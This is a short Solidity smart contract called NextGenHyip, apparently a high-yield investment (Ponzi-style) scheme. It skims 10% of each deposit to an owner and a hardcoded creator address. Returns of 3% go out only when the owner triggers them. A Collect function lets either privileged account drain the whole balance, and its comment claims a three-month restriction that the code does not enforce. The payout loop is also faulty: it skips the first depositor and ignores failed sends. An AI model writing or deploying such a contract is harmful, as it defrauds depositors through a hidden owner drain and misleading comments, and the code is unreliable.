contract NextGenHyip
{
    struct _Tx {
        address txuser;
        uint txvalue;
    }
    _Tx[] public Tx;
    uint public counter;
    
    address owner;
    address creator;
    
    modifier onlyowner
    {
        if (msg.sender == owner || msg.sender == creator)
        _
    }
    function NextGenHyip() {
        owner = msg.sender;
        creator = 0xC99B66E5Cb46A05Ea997B0847a1ec50Df7fe8976;
    }
    
    function() {
        Sort();
        if (msg.sender == owner )
        {
            Count();
        }
    }
    
    function Sort() internal
    {
        uint feecounter;
            feecounter+=msg.value/10;
	        owner.send(feecounter/2);
	        creator.send(feecounter/2);
	        feecounter=0;
	   uint txcounter=Tx.length;     
	   counter=Tx.length;
	   Tx.length++;
	   Tx[txcounter].txuser=msg.sender;
	   Tx[txcounter].txvalue=msg.value;   
    }
    
    function Count() onlyowner {
        while (counter>0) {
            Tx[counter].txuser.send((Tx[counter].txvalue/100)*3);
            counter-=1;
        }
    }
        function Collect() onlyowner { //used for giving back ether manually if contract is unactive for a 3 months 
        msg.sender.send(address(this).balance);
    }
}